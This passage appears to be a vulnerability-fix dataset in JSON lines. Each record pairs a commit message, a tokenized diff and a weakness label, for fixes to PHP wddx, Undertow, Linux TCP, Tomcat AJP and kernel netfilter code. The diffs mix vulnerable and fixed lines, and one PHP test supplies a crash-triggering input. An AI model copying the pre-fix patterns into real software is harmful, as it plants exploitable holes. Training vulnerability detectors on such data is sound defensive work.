"{}", "'\"", ",", "state", ",", "resultType", ")", ";"], "docstring_tokens": ["input", "validation"]}
{"contents": ["Fix", "bug", "#73831", "-", "NULL", "Pointer", "Dereference", "while", "unserialize", "php", "object"], "code_tokens": ["@", "@", "-", "0", ",", "0", "+", "1", ",", "23", "@", "@", "-", "-", "TEST", "-", "-", "Bug", "#", "73831", "(", "NULL", "Pointer", "Dereference", "while", "unserialize", "php", "object", ")", "-", "-", "SKIPIF", "-", "-", "<", "?", "php", "if", "(", "!", "extension_loaded", "(", "\"", "wddx", "\"", "))", "print", "\"", "skip", "\"", ";", "?", ">", "-", "-", "FILE", "-", "-", "<", "?", "php", "$", "xml", "=", "<", "<<", "EOF", "<", "?", "xml", "version", "=", "\"", "1", ".", "0", "\"", "?", ">", "<", "wddxPacket", "version", "=", "\"", "1", ".", "0", "\"", ">", "<", "struct", ">", "<", "var", "name", "=", "\"", "php_class_name", "\"", ">", "<", "string", ">", "Throwable", "<", "/", "string", ">", "<", "/", "var", ">", "<", "/", "struct", ">", "<", "/", "wddxPacket", ">", "EOF", ";", "try", "{", "$", "wddx", "=", "wddx_deserialize", "(", "$", "xml", ")", ";", "}", "catch", "(", "Error", "$", "e", ")", "{", "echo", "$", "e", "-", ">", "getMessage", "(", ");", "}", "?", ">", "-", "-", "EXPECTF", "-", "-", "Warning", ":", "wddx_deserialize", "(", "):", "Class", "throwable", "can", "not", "be", "instantiated", "in", "%", "sbug73831", ".", "php", "on", "line", "%", "d", "Cannot", "instantiate", "interface", "Throwable", "@", "@", "-", "908", ",", "7", "+", "908", ",", "7", "@", "@", "static", "void", "php_wddx_pop_element", "(", "void", "*", "user_data", ",", "const", "XML_Char", "*", "name", ")", "if", "(", "!", "strcmp", "(", "(", "char", "*", ")", "name", ",", "EL_BINARY", ")", ")", "{", "zend_string", "*", "new_str", "=", "NULL", ";", "if", "(", "ZSTR_EMPTY_ALLOC", "(", ")", "!", "=", "Z_STR", "(", "ent1", "-", ">", "data", ")", ")", "{", "new_str", "=", "php_base64_decode", "(", "(", "unsigned", "char", "*", ")", "Z_STRVAL", "(", "ent1", "-", ">", "data", ")", ",", "Z_STRLEN", "(", "ent1", "-", ">", "data", ")", ");", "@", "@", "-", "967", ",", "22", "+", "967", ",", "26", "@", "@", "static", "void", "php_wddx_pop_element", "(", "void", "*", "user_data", ",", "const", "XML_Char", "*", "name", ")", "php_error_docref", "(", "NULL", ",", "E_WARNING", ",", "\"", "Class", "%", "s", "can", "not", "be", "unserialized", "\"", ",", "Z_STRVAL", "(", "ent1", "-", ">", "data", ")", ");", "}", "else", "{", "/", "*", "Initialize", "target", "object", "*", "/", "object_init_ex", "(", "&", "obj", ",", "pce", ")", ";", "/", "*", "Merge", "current", "hashtable", "with", "object", "'", "s", "default", "properties", "*", "/", "zend_hash_merge", "(", "Z_OBJPROP", "(", "obj", ")", ",", "Z_ARRVAL", "(", "ent2", "-", ">", "data", ")", ",", "zval_add_ref", ",", "0", ")", ";", "if", "(", "incomplete_class", ")", "{", "php_store_class_name", "(", "&", "obj", ",", "Z_STRVAL", "(", "ent1", "-", ">", "data", ")", ",", "Z_STRLEN", "(", "ent1", "-", ">", "data", ")", ");", "if", "(", "object_init_ex", "(", "&", "obj", ",", "pce", ")", "!", "=", "SUCCESS", "|", "|", "EG", "(", "exception", ")", ")", "{", "zval_ptr_dtor", "(", "&", "ent2", "-", ">", "data", ")", ";", "ZVAL_UNDEF", "(", "&", "ent2", "-", ">", "data", ")", ";", "php_error_docref", "(", "NULL", ",", "E_WARNING", ",", "\"", "Class", "%", "s", "can", "not", "be", "instantiated", "\"", ",", "Z_STRVAL", "(", "ent1", "-", ">", "data", ")", ");", "}", "else", "{", "/", "*", "Merge", "current", "hashtable", "with", "object", "'", "s", "default", "properties", "*", "/", "zend_hash_merge", "(", "Z_OBJPROP", "(", "obj", ")", ",", "Z_ARRVAL", "(", "ent2", "-", ">", "data", ")", ",", "zval_add_ref", ",", "0", ")", ";", "if", "(", "incomplete_class", ")", "{", "php_store_class_name", "(", "&", "obj", ",", "Z_STRVAL", "(", "ent1", "-", ">", "data", ")", ",", "Z_STRLEN", "(", "ent1", "-", ">", "data", ")", ");", "}", "/", "*", "Clean", "up", "old", "array", "entry", "*", "/", "zval_ptr_dtor", "(", "&", "ent2", "-", ">", "data", ")", ";", "/", "*", "Set", "stack", "entry", "to", "point", "to", "the", "newly", "created", "object", "*", "/", "ZVAL_COPY_VALUE", "(", "&", "ent2", "-", ">", "data", ",", "&", "obj", ")", ";", "}", "/", "*", "Clean", "up", "old", "array", "entry", "*", "/", "zval_ptr_dtor", "(", "&", "ent2", "-", ">", "data", ")", ";", "/", "*", "Set", "stack", "entry", "to", "point", "to", "the", "newly", "created", "object", "*", "/", "ZVAL_COPY_VALUE", "(", "&", "ent2", "-", ">", "data", ",", "&", "obj", ")", ";", "}", "/", "*", "Clean", "up", "class", "name", "var", "entry", "*", "/"], "docstring_tokens": ["pointer", "dereference"]}
{"contents": ["[UNDERTOW-1657]", "Fix", "issue", "with", "100-continue", "and", "h2"], "code_tokens": ["@", "@", "-", "23", ",", "20", "+", "23", ",", "19", "@", "@", "import", "java", ".", "nio", ".", "channels", ".", "FileChannel", ";", "import", "java", ".", "util", ".", "concurrent", ".", "TimeUnit", ";", "import", "org", ".", "xnio", ".", "channels", ".", "StreamSinkChannel", ";", "import", "org", ".", "xnio", ".", "conduits", ".", "AbstractStreamSourceConduit", ";", "import", "org", ".", "xnio", ".", "conduits", ".", "StreamSourceConduit", ";", "import", "io", ".", "undertow", ".", "server", ".", "ConduitWrapper", ";", "import", "io", ".", "undertow", ".", "server", ".", "Connectors", ";", "import", "io", ".", "undertow", ".", "server", ".", "ResponseCommitListener", ";", "import", "io", ".", "undertow", ".", "server", ".", "protocol", ".", "http", ".", "HttpContinue", ";", "import", "io", ".", "undertow", ".", "server", ".", "HttpHandler", ";", "import", "io", ".", "undertow", ".", "server", ".", "HttpServerExchange", ";", "import", "io", ".", "undertow", ".", "server", ".", "ResponseCommitListener", ";", "import", "io", ".", "undertow", ".", "server", ".", "protocol", ".", "http", ".", "HttpContinue", ";", "import", "io", ".", "undertow", ".", "util", ".", "ConduitFactory", ";", "import", "io", ".", "undertow", ".", "util", ".", "StatusCodes", ";", "import", "org", ".", "xnio", ".", "IoUtils", ";", "import", "org", ".", "xnio", ".", "channels", ".", "StreamSinkChannel", ";", "import", "org", ".", "xnio", ".", "conduits", ".", "AbstractStreamSourceConduit", ";", "import", "org", ".", "xnio", ".", "conduits", ".", "StreamSourceConduit", ";", "/", "**", "*", "Handler", "for", "requests", "that", "require", "100", "-", "continue", "responses", ".", "If", "an", "attempt", "is", "made", "to", "read", "from", "the", "source", "*", "channel", "then", "a", "100", "continue", "response", "is", "sent", ".", "@", "@", "-", "48", ",", "7", "+", "47", ",", "7", "@", "@", "private", "static", "final", "ConduitWrapper", "<", "StreamSourceConduit", ">", "WRAPPER", "=", "new", "ConduitWrapper", "<", "StreamSourceConduit", ">", "()", "{", "@", "Override", "public", "StreamSourceConduit", "wrap", "(", "final", "ConduitFactory", "<", "StreamSourceConduit", ">", "factory", ",", "final", "HttpServerExchange", "exchange", ")", "{", "if", "(", "exchange", ".", "isRequestChannelAvailable", "(", ")", "&", "&", "!", "exchange", ".", "isResponseStarted", "(", "))", "{", "if", "(", "exchange", ".", "isRequestChannelAvailable", "(", ")", "&", "&", "!", "exchange", ".", "isResponseStarted", "(", "))", "{", "return", "new", "ContinueConduit", "(", "factory", ".", "create", "(", "),", "exchange", ")", ";", "}", "return", "factory", ".", "create", "(", ");", "@", "@", "-", "72", ",", "7", "+", "71", ",", "7", "@", "@", "public", "void", "beforeCommit", "(", "HttpServerExchange", "exchange", ")", "{", "if", "(", "!", "HttpContinue", ".", "isContinueResponseSent", "(", "exchange", ")", ")", "{", "exchange", ".", "setPersistent", "(", "false", ")", ";", "/", "/", "we", "also", "kill", "the", "request", "channel", ",", "because", "it", "is", "unusable", "now", "IoUtils", ".", "safeClose", "(", "exchange", ".", "getRequestChannel", "(", "))", ";", "exchange", ".", "getConnection", "(", ").", "terminateRequestChannel", "(", "exchange", ")", ";", "}", "}", "}", ");", "@", "@", "-", "26", ",", "6", "+", "26", ",", "8", "@", "@", "import", "io", ".", "undertow", ".", "server", ".", "HttpServerExchange", ";", "import", "io", ".", "undertow", ".", "server", ".", "SSLSessionInfo", ";", "import", "io", ".", "undertow", ".", "util", ".", "DateUtils", ";", "import", "org", ".", "xnio", ".", "IoUtils", ";", "import", "org", ".", "xnio", ".", "OptionMap", ";", "import", "io", ".", "undertow", ".", "connector", ".", "ByteBufferPool", ";", "import", "org", ".", "xnio", ".", "StreamConnection", ";", "@", "@", "-", "61", ",", "7", "+", "63", ",", "9", "@", "@", "public", "boolean", "isContinueResponseSupported", "(", ")", "{", "@", "Override", "public", "void", "terminateRequestChannel", "(", "HttpServerExchange", "exchange", ")", "{", "/", "/", "todo", ":", "terminate", "if", "(", "!", "exchange", ".", "isPersistent", "(", "))", "{", "IoUtils", ".", "safeClose", "(", "getChannel", "(", ").", "getSourceChannel", "(", "))", ";", "}", "}", "@", "Override", "@", "@", "-", "36", ",", "6", "+", "36", ",", "8", "@", "@", "import", "io", ".", "undertow", ".", "util", ".", "HttpString", ";", "import", "io", ".", "undertow", ".", "util", ".", "ImmediatePooledByteBuffer", ";", "import", "io", ".", "undertow", ".", "util", ".", "Methods", ";", "import", "org", ".", "xnio", ".", "IoUtils", ";", "import", "org", ".", "xnio", ".", "OptionMap", ";", "import", "io", ".", "undertow", ".", "connector", ".", "ByteBufferPool", ";", "import", "io", ".", "undertow", ".", "connector", ".", "PooledByteBuffer", ";", "@", "@", "-", "143", ",", "7", "+", "145", ",", "9", "@", "@", "public", "boolean", "isContinueResponseSupported", "(", ")", "{", "@", "Override", "public", "void", "terminateRequestChannel", "(", "HttpServerExchange", "exchange", ")", "{", "if", "(", "!", "exchange", ".", "isPersistent", "(", "))", "{", "IoUtils", ".", "safeClose", "(", "getChannel", "(", ").", "getSourceChannel", "(", "))", ";", "}", "}", "/", "**"], "docstring_tokens": ["http", "request", "smuggling"]}
{"contents": ["tcp:", "add", "tcp_min_snd_mss", "sysctl", "Some", "TCP", "peers", "announce", "a", "very", "small", "MSS", "option", "in", "their", "SYN", "and/or", "SYN/ACK", "messages.", "This", "forces", "the", "stack", "to", "send", "packets", "with", "a", "very", "high", "network/cpu", "overhead.", "Linux", "has", "enforced", "a", "minimal", "value", "of", "48.", "Since", "this", "value", "includes", "the", "size", "of", "TCP", "options,", "and", "that", "the", "options", "can", "consume", "up", "to", "40", "bytes,", "this", "means", "that", "each", "segment", "can", "include", "only", "8", "bytes", "of", "payload.", "In", "some", "cases,", "it", "can", "be", "useful", "to", "increase", "the", "minimal", "value", "to", "a", "saner", "value.", "We", "still", "let", "the", "default", "to", "48", "(TCP_MIN_SND_MSS),", "for", "compatibility", "reasons.", "Note", "that", "TCP_MAXSEG", "socket", "option", "enforces", "a", "minimal", "value", "of", "(TCP_MIN_MSS).", "David", "Miller", "increased", "this", "minimal", "value", "in", "commit", "c39508d6f118", "(\"tcp:", "Make", "TCP_MAXSEG", "minimum", "more", "correct.\")", "from", "64", "to", "88.", "We", "might", "in", "the", "future", "merge", "TCP_MIN_SND_MSS", "and", "TCP_MIN_MSS.", "--", "tcp", "mss", "hardcoded", "to", "48", "Signed-off-by:", "Eric", "Dumazet", "<edumazet@google.com>", "Suggested-by:", "Jonathan", "Looney", "<jtl@netflix.com>", "Acked-by:", "Neal", "Cardwell", "<ncardwell@google.com>", "Cc:", "Yuchung", "Cheng", "<ycheng@google.com>", "Cc:", "Tyler", "Hicks", "<tyhicks@canonical.com>", "Cc:", "Bruce", "Curtis", "<brucec@netflix.com>", "Cc:", "Jonathan", "Lemon", "<jonathan.lemon@gmail.com>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": ["@", "@", "-", "255", ",", "6", "+", "255", ",", "14", "@", "@", "tcp_base_mss", "-", "INTEGER", "Path", "MTU", "discovery", "(", "MTU", "probing", ")", ".", "If", "MTU", "probing", "is", "enabled", ",", "this", "is", "the", "initial", "MSS", "used", "by", "the", "connection", ".", "tcp_min_snd_mss", "-", "INTEGER", "TCP", "SYN", "and", "SYNACK", "messages", "usually", "advertise", "an", "ADVMSS", "option", ",", "as", "described", "in", "RFC", "1122", "and", "RFC", "6691", ".", "If", "this", "ADVMSS", "option", "is", "smaller", "than", "tcp_min_snd_mss", ",", "it", "is", "silently", "capped", "to", "tcp_min_snd_mss", ".", "Default", ":", "48", "(", "at", "least", "8", "bytes", "of", "payload", "per", "segment", ")", "tcp_congestion_control", "-", "STRING", "Set", "the", "congestion", "control", "algorithm", "to", "be", "used", "for", "new", "connections", ".", "The", "algorithm", "\"", "reno", "\"", "is", "always", "available", ",", "but", "@", "@", "-", "117", ",", "6", "+", "117", ",", "7", "@", "@", "struct", "netns_ipv4", "{", "#", "endif", "int", "sysctl_tcp_mtu_probing", ";", "int", "sysctl_tcp_base_mss", ";", "int", "sysctl_tcp_min_snd_mss", ";", "int", "sysctl_tcp_probe_threshold", ";", "u32", "sysctl_tcp_probe_interval", ";", "@", "@", "-", "39", ",", "6", "+", "39", ",", "8", "@", "@", "static", "int", "ip_local_port_range_min", "[", "]", "=", "{", "1", ",", "1", "}", ";", "static", "int", "ip_local_port_range_max", "[", "]", "=", "{", "65535", ",", "65535", "}", ";", "static", "int", "tcp_adv_win_scale_min", "=", "-", "31", ";", "static", "int", "tcp_adv_win_scale_max", "=", "31", ";", "static", "int", "tcp_min_snd_mss_min", "=", "TCP_MIN_SND_MSS", ";", "static", "int", "tcp_min_snd_mss_max", "=", "65535", ";", "static", "int", "ip_privileged_port_min", ";", "static", "int", "ip_privileged_port_max", "=", "65535", ";", "static", "int", "ip_ttl_min", "=", "1", ";", "@", "@", "-", "774", ",", "6", "+", "776", ",", "15", "@", "@", "static", "struct", "ctl_table", "ipv4_net_table", "[", "]", "=", "{", ".", "mode", "=", "0644", ",", ".", "proc_handler", "=", "proc_dointvec", ",", "}", ",", "{", ".", "procname", "=", "\"", "tcp_min_snd_mss", "\"", ",", ".", "data", "=", "&", "init_net", ".", "ipv4", ".", "sysctl_tcp_min_snd_mss", ",", ".", "maxlen", "=", "sizeof", "(", "int", ")", ",", ".", "mode", "=", "0644", ",", ".", "proc_handler", "=", "proc_dointvec_minmax", ",", ".", "extra1", "=", "&", "tcp_min_snd_mss_min", ",", ".", "extra2", "=", "&", "tcp_min_snd_mss_max", ",", "}", ",", "{", ".", "procname", "=", "\"", "tcp_probe_threshold", "\"", ",", ".", "data", "=", "&", "init_net", ".", "ipv4", ".", "sysctl_tcp_probe_threshold", ",", "@", "@", "-", "2628", ",", "6", "+", "2628", ",", "7", "@", "@", "static", "int", "__net_init", "tcp_sk_init", "(", "struct", "net", "*", "net", ")", "net", "-", ">", "ipv4", ".", "sysctl_tcp_ecn_fallback", "=", "1", ";", "net", "-", ">", "ipv4", ".", "sysctl_tcp_base_mss", "=", "TCP_BASE_MSS", ";", "net", "-", ">", "ipv4", ".", "sysctl_tcp_min_snd_mss", "=", "TCP_MIN_SND_MSS", ";", "net", "-", ">", "ipv4", ".", "sysctl_tcp_probe_threshold", "=", "TCP_PROBE_THRESHOLD", ";", "net", "-", ">", "ipv4", ".", "sysctl_tcp_probe_interval", "=", "TCP_PROBE_INTERVAL", ";", "@", "@", "-", "1459", ",", "8", "+", "1459", ",", "7", "@", "@", "static", "inline", "int", "__tcp_mtu_to_mss", "(", "struct", "sock", "*", "sk", ",", "int", "pmtu", ")", "mss_now", "-", "=", "icsk", "-", ">", "icsk_ext_hdr_len", ";", "/", "*", "Then", "reserve", "room", "for", "full", "set", "of", "TCP", "options", "and", "8", "bytes", "of", "data", "*", "/", "if", "(", "mss_now", "<", "TCP_MIN_SND_MSS", ")", "mss_now", "=", "TCP_MIN_SND_MSS", ";", "mss_now", "=", "max", "(", "mss_now", ",", "sock_net", "(", "sk", ")", "->", "ipv4", ".", "sysctl_tcp_min_snd_mss", ")", ";", "return", "mss_now", ";", "}"], "docstring_tokens": ["integer", "overflow"]}
{"contents": ["Add", "new", "AJP", "attribute", "allowedArbitraryRequestAttributes", "Requests", "with", "unrecognised", "attributes", "will", "be", "blocked", "with", "a", "403"], "code_tokens": ["@", "@", "-", "17", ",", "6", "+", "17", ",", "7", "@", "@", "package", "org", ".", "apache", ".", "coyote", ".", "ajp", ";", "import", "java", ".", "net", ".", "InetAddress", ";", "import", "java", ".", "util", ".", "regex", ".", "Pattern", ";", "import", "org", ".", "apache", ".", "coyote", ".", "AbstractProtocol", ";", "import", "org", ".", "apache", ".", "coyote", ".", "Processor", ";", "@", "@", "-", "188", ",", "6", "+", "189", ",", "18", "@", "@", "public", "boolean", "getSecretRequired", "(", ")", "{", "}", "private", "Pattern", "allowedArbitraryRequestAttributesPattern", ";", "public", "void", "setAllowedArbitraryRequestAttributes", "(", "String", "allowedArbitraryRequestAttributes", ")", "{", "this", ".", "allowedArbitraryRequestAttributesPattern", "=", "Pattern", ".", "compile", "(", "allowedArbitraryRequestAttributes", ")", ";", "}", "public", "String", "getAllowedArbitraryRequestAttributes", "(", ")", "{", "return", "allowedArbitraryRequestAttributesPattern", ".", "pattern", "(", ");", "}", "protected", "Pattern", "getAllowedArbitraryRequestAttributesPattern", "(", ")", "{", "return", "allowedArbitraryRequestAttributesPattern", ";", "}", "/", "**", "*", "AJP", "packet", "size", ".", "*", "/", "@", "@", "-", "25", ",", "6", "+", "25", ",", "11", "@", "@", "import", "java", ".", "security", ".", "NoSuchProviderException", ";", "import", "java", ".", "security", ".", "cert", ".", "CertificateFactory", ";", "import", "java", ".", "security", ".", "cert", ".", "X509Certificate", ";", "import", "java", ".", "util", ".", "Collections", ";", "import", "java", ".", "util", ".", "HashSet", ";", "import", "java", ".", "util", ".", "Set", ";", "import", "java", ".", "util", ".", "regex", ".", "Matcher", ";", "import", "java", ".", "util", ".", "regex", ".", "Pattern", ";", "import", "javax", ".", "servlet", ".", "http", ".", "HttpServletResponse", ";", "@", "@", "-", "78", ",", "6", "+", "83", ",", "9", "@", "@", "private", "static", "final", "byte", "[", "]", "pongMessageArray", ";", "private", "static", "final", "Set", "<", "String", ">", "javaxAttributes", ";", "static", "{", "/", "/", "Allocate", "the", "end", "message", "array", "AjpMessage", "endMessage", "=", "new", "AjpMessage", "(", "16", ")", ";", "@", "@", "-", "118", ",", "6", "+", "126", ",", "14", "@", "@", "pongMessageArray", "=", "new", "byte", "[", "pongMessage", ".", "getLen", "(", ")]", ";", "System", ".", "arraycopy", "(", "pongMessage", ".", "getBuffer", "(", "),", "0", ",", "pongMessageArray", ",", "0", ",", "pongMessage", ".", "getLen", "(", "))", ";", "/", "/", "Build", "the", "Set", "of", "javax", "attributes", "Set", "<", "String", ">", "s", "=", "new", "HashSet", "<", ">(", ");", "s", ".", "add", "(", "\"", "javax", ".", "servlet", ".", "request", ".", "cipher_suite", "\"", ");", "s", ".", "add", "(", "\"", "javax", ".", "servlet", ".", "request", ".", "key_size", "\"", ");", "s", ".", "add", "(", "\"", "javax", ".", "servlet", ".", "request", ".", "ssl_session", "\"", ");", "s", ".", "add", "(", "\"", "javax", ".", "servlet", ".", "request", ".", "X509Certificate", "\"", ");", "javaxAttributes", "=", "Collections", ".", "unmodifiableSet", "(", "s", ")", ";", "}", "@", "@", "-", "728", ",", "8", "+", "744", ",", "26", "@", "@", "private", "void", "prepareRequest", "(", ")", "{", "}", "}", "else", "if", "(", "n", ".", "equals", "(", "Constants", ".", "SC_A_SSL_PROTOCOL", ")", ")", "{", "request", ".", "setAttribute", "(", "SSLSupport", ".", "PROTOCOL_VERSION_KEY", ",", "v", ")", ";", "}", "else", "if", "(", "n", ".", "equals", "(", "\"", "JK_LB_ACTIVATION", "\"", "))", "{", "request", ".", "setAttribute", "(", "n", ",", "v", ")", ";", "}", "else", "if", "(", "javaxAttributes", ".", "contains", "(", "n", ")", ")", "{", "request", ".", "setAttribute", "(", "n", ",", "v", ")", ";", "}", "else", "{", "request", ".", "setAttribute", "(", "n", ",", "v", ")", ";", "/", "/", "All", "'", "known", "'", "attributes", "will", "be", "processed", "by", "the", "previous", "/", "/", "blocks", ".", "Any", "remaining", "attribute", "is", "an", "'", "arbitrary", "'", "one", ".", "Pattern", "pattern", "=", "protocol", ".", "getAllowedArbitraryRequestAttributesPattern", "(", ");", "if", "(", "pattern", "=", "=", "null", ")", "{", "response", ".", "setStatus", "(", "403", ")", ";", "setErrorState", "(", "ErrorState", ".", "CLOSE_CLEAN", ",", "null", ")", ";", "}", "else", "{", "Matcher", "m", "=", "pattern", ".", "matcher", "(", "n", ")", ";", "if", "(", "m", ".", "matches", "(", "))", "{", "request", ".", "setAttribute", "(", "n", ",", "v", ")", ";", "}", "else", "{", "response", ".", "setStatus", "(", "403", ")", ";", "setErrorState", "(", "ErrorState", ".", "CLOSE_CLEAN", ",", "null", ")", ";", "}", "}", "}", "break", ";", "@", "@", "-", "190", ",", "6", "+", "190", ",", "11", "@", "@", "will", "not", "start", "unless", "the", "<", "code", ">", "secret", "<", "/", "code", ">", "attribute", "is", "configured", "to", "a", "non", "-", "null", ",", "non", "-", "zero", "length", "String", ".", "(", "markt", ")", "<", "/", "add", ">", "<", "add", ">", "Add", "a", "new", "attribute", ",", "<", "code", ">", "allowedArbitraryRequestAttributes", "<", "/", "code", ">", "to", "the", "AJP", "/", "1", ".", "3", "Connector", ".", "Requests", "with", "unreconised", "attributes", "will", "be", "blocked", "with", "a", "403", ".", "(", "markt", ")", "<", "/", "add", ">", "<", "/", "changelog", ">", "<", "/", "subsection", ">", "<", "subsection", "name", "=", "\"", "Jasper", "\"", ">", "@", "@", "-", "311", ",", "6", "+", "311", ",", "25", "@", "@", "port", ".", "By", "default", ",", "the", "loopback", "address", "will", "be", "used", ".", "</", "p", ">", "<", "/", "attribute", ">", "<", "attribute", "name", "=", "\"", "allowedArbitraryRequestAttributes", "\"", "required", "=", "\"", "false", "\"", ">", "<", "p", ">", "The", "AJP", "protocol", "passes", "some", "information", "from", "the", "reverse", "proxy", "to", "the", "AJP", "connector", "using", "request", "attributes", ".", "These", "attributes", "are", ":", "</", "p", ">", "<", "ul", ">", "<", "li", ">", "javax", ".", "servlet", ".", "request", ".", "cipher_suite", "<", "/", "li", ">", "<", "li", ">", "javax", ".", "servlet", ".", "request", ".", "key_size", "<", "/", "li", ">", "<", "li", ">", "javax", ".", "servlet", ".", "request", ".", "ssl_session", "<", "/", "li", ">", "<", "li", ">", "javax", ".", "servlet", ".", "request", ".", "X509Certificate", "<", "/", "li", ">", "<", "li", ">", "AJP_LOCAL_ADDR", "<", "/", "li", ">", "<", "li", ">", "AJP_REMOTE_PORT", "<", "/", "li", ">", "<", "li", ">", "AJP_SSL_PROTOCOL", "<", "/", "li", ">", "<", "li", ">", "JK_LB_ACTIVATION", "<", "/", "li", ">", "<", "/", "ul", ">", "<", "p", ">", "The", "AJP", "protocol", "supports", "the", "passing", "of", "arbitrary", "request", "attributes", ".", "Requests", "containing", "arbitrary", "request", "attributes", "will", "be", "rejected", "with", "a", "403", "response", "unless", "the", "entire", "attribute", "name", "matches", "this", "regular", "expression", ".", "If", "not", "specified", ",", "the", "default", "value", "is", "<", "code", ">", "null", "<", "/", "code", ">", ".<", "/", "p", ">", "<", "/", "attribute", ">", "<", "attribute", "name", "=", "\"", "bindOnInit", "\"", "required", "=", "\"", "false", "\"", ">", "<", "p", ">", "Controls", "when", "the", "socket", "used", "by", "the", "connector", "is", "bound", ".", "By", "default", "it", "is", "bound", "when", "the", "connector", "is", "initiated", "and", "unbound", "when", "the", "connector", "is"], "docstring_tokens": ["remote", "code", "execution"]}
{"contents": ["bridge:", "netfilter:", "fix", "information", "leak", "Struct", "tmp", "is", "copied", "from", "userspace.", "It", "is", "not", "checked", "whether", "the", "\"name\"", "field", "is", "NULL", "terminated.", "This", "may", "lead", "to", "buffer", "overflow", "and", "passing", "contents", "of", "kernel", "stack", "as", "a", "module", "name", "to", "try_then_request_module()", "and,", "consequently,", "to", "modprobe", "commandline.", "It", "would", "be", "seen", "by", "all", "userspace", "processes.", "Signed-off-by:", "Vasiliy", "Kulikov", "<segoon@openwall.com>", "Signed-off-by:", "Patrick", "McHardy", "<kaber@trash.net>"], "code_tokens": ["@", "@", "-", "1107", ",", "6", "+", "1107", ",", "8", "@", "@", "static", "int", "do_replace", "(", "struct", "net", "*", "net", ",", "const", "void", "__user", "*", "user", ",", "if", "(", "tmp", ".", "num_counters", ">", "=", "INT_MAX", "/", "sizeof", "(", "struct", "ebt_counter", ")", ")", "return", "-", "ENOMEM", ";", "tmp", ".", "name", "[", "sizeof", "(", "tmp", ".", "name", ")", "-", "1", "]", "=", "0", ";", "countersize", "=", "COUNTER_OFFSET", "(", "tmp", ".", "nentries", ")", "*", "nr_cpu_ids", ";", "newinfo", "=", "vmalloc", "(", "sizeof", "(", "*", "newinfo", ")", "+", "countersize", ")", ";", "if", "(", "!", "newinfo", ")"], "docstring_tokens": ["information", "leak"]}
{"contents": ["mac80211_hwsim:", "fix", "possible", "memory", "leak", "in", "hwsim_new_radio_nl()", "'hwname'", "is", "malloced", "in", "hwsim_new_radio_nl()", "and", "should", "be", "freed", "before", "leaving", "from", "the", "error", "handling", "cases,", "otherwise", "it", "will", "cause", "memory", "leak.", "Fixes:", "ff4dd73dd2b4", "(\"mac80211_hwsim:", "check", "HWSIM_ATTR_RADIO_NAME", "length\")", "Signed-off-by:", "Wei", "Yongjun", "<weiyongjun1@huawei.com>", "Reviewed-by:", "Ben", "Hutchings", "<ben.hutchings@codethink.co.uk>", "Signed-off-by:", "Johannes", "Berg", "<johannes.berg@intel.com>"], "code_tokens": ["@", "@", "-", "3197", ",", "8", "+", "3197", ",", "10", "@", "@", "static", "int", "hwsim_new_radio_nl", "(", "struct", "sk_buff", "*", "msg", ",", "struct", "genl_info", "*", "info", ")", "if", "(", "info", "-", ">", "attrs", "[", "HWSIM_ATTR_REG_CUSTOM_REG", "]", ")", "{", "u32", "idx", "=", "nla_get_u32", "(", "info", "-", ">", "attrs", "[", "HWSIM_ATTR_REG_CUSTOM_REG", "]", ");", "if", "(", "idx", ">", "=", "ARRAY_SIZE", "(", "hwsim_world_regdom_custom", ")", ")", "if", "(", "idx", ">", "=", "ARRAY_SIZE", "(", "hwsim_world_regdom_custom", ")", ")", "{", "kfree", "(", "hwname", ")", ";", "return", "-", "EINVAL", ";", "}", "param", ".", "regd", "=", "hwsim_world_regdom_custom", "[", "idx", "]", ";", "}"], "docstring_tokens": ["memory", "leak"]}
{"contents": ["Bugfix/august2019", "(#18)", "*", "fixed", "password", "storage,", "AppMon", "server's", "configuration", "needs", "to", "be", "updated", "*", "added", "@RequirePOST", "to", "FormValidation", "method", "in", "TAGlobalConfiguration"], "code_tokens": ["@", "@", "-", "1", ",", "176", "+", "1", ",", "183", "@", "@", "<", "?", "xml", "version", "=", "\"", "1", ".", "0", "\"", "?>", "<", "!-", "-", "Copyright", "(", "c", ")", "2008", "-", "2016", ",", "DYNATRACE", "LLC", "All", "rights", "reserved", ".", "Redistribution", "and", "use", "in", "source", "and", "binary", "forms", ",", "with", "or", "without", "modification", ",", "are", "permitted", "provided", "that", "the", "following", "conditions", "are", "met", ":", "*", "Redistributions", "of", "source", "code", "must", "retain", "the", "above", "copyright", "notice", ",", "this", "list", "of", "conditions", "and", "the", "following", "disclaimer", ".", "*", "Redistributions", "in", "binary", "form", "must", "reproduce", "the", "above", "copyright", "notice", ",", "this", "list", "of", "conditions", "and", "the", "following", "disclaimer", "in", "the", "documentation", "and", "/", "or", "other", "materials", "provided", "with", "the", "distribution", ".", "*", "Neither", "the", "name", "of", "the", "dynaTrace", "software", "nor", "the", "names", "of", "its", "contributors", "may", "be", "used", "to", "endorse", "or", "promote", "products", "derived", "from", "this", "software", "without", "specific", "prior", "written", "permission", ".", "THIS", "SOFTWARE", "IS", "PROVIDED", "BY", "THE", "COPYRIGHT", "HOLDERS", "AND", "CONTRIBUTORS", "\"", "AS", "IS", "\"", "AND", "ANY", "EXPRESS", "OR", "IMPLIED", "WARRANTIES", ",", "INCLUDING", ",", "BUT", "NOT", "LIMITED", "TO", ",", "THE", "IMPLIED", "WARRANTIES", "OF", "MERCHANTABILITY", "AND", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "ARE", "DISCLAIMED", ".", "IN", "NO", "EVENT", "SHALL", "THE", "COPYRIGHT", "OWNER", "OR", "CONTRIBUTORS", "BE", "LIABLE", "FOR", "ANY", "DIRECT", ",", "INDIRECT", ",", "INCIDENTAL", ",", "SPECIAL", ",", "EXEMPLARY", ",", "OR", "CONSEQUENTIAL", "DAMAGES", "(", "INCLUDING", ",", "BUT", "NOT", "LIMITED", "TO", ",", "PROCUREMENT", "OF", "SUBSTITUTE", "GOODS", "OR", "SERVICES", ";", "LOSS", "OF", "USE", ",", "DATA", ",", "OR", "PROFITS", ";", "OR", "BUSINESS", "INTERRUPTION", ")", "HOWEVER", "CAUSED", "AND", "ON", "ANY", "THEORY", "OF", "LIABILITY", ",", "WHETHER", "IN", "CONTRACT", ",", "STRICT", "LIABILITY", ",", "OR", "TORT", "(", "INCLUDING", "NEGLIGENCE", "OR", "OTHERWISE", ")", "ARISING", "IN", "ANY", "WAY", "OUT", "OF", "THE", "USE", "OF", "THIS", "SOFTWARE", ",", "EVEN", "IF", "ADVISED", "OF", "THE", "POSSIBILITY", "OF", "SUCH", "DAMAGE", ".", ">", "<", "project", "xmlns", "=", "\"", "http", ":", "//", "maven", ".", "apache", ".", "org", "/", "POM", "/", "4", ".", "0", ".", "0", 